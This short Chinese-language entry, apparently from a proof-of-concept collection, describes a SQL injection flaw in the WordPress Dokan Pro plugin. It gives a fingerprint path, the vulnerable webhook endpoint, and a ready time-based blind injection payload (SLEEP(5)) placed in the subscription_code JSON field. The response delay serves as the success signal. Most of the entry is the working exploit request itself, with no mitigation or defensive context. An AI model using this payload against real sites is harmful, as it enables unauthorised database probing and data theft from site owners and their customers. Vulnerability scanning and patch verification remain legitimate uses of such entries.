# WordPressDokanPro插件SQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`"/wp-content/plugins/dokan-pro/"`
- **请求**：`POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1`

**Payload**
```
{"env":"1","event":"invoice.created","resource":{"subscription_code":"' AND (SELECT 9155 FROM (SELECT(SLEEP(5)))JfFK) AND 'CKYA'='CKYA"}}
```
- **响应特征**：302 响应时间>=5s